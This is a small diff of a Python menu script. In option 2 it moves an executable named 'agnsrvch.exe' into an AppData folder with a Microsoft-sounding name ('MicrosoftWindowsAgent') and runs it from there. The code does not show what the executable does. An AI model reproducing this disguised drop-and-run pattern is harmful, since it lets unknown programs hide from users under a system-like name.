@@ -32,10 +32,10 @@ elif option == '1':
     cmd("Sounds.exe")
 elif option == '2':
     file_local_save = getenv('APPDATA')
-    cmd(rf"mkdir '{file_local_save}\Microsoft Windows Agent'")
-    cmd(rf"move agnsrvch.exe {file_local_save}\Microsoft Windows Agent")
+    cmd(rf"mkdir '{file_local_save}\MicrosoftWindowsAgent'")
+    cmd(rf"move agnsrvch.exe {file_local_save}\MicrosoftWindowsAgent")
     cmd("cls")
-    cmd(rf"{file_local_save}\Microsoft Windows Agent\agnsrvch.exe")
+    cmd(rf"{file_local_save}\MicrosoftWindowsAgent\agnsrvch.exe")
 else:
     print(f"{wrong_value}")
     print(f"{"\n" * 35}{wrong_value}\n{version} By {color.type.Black}{color.fg.purple}EoRoferr{color.reset}")
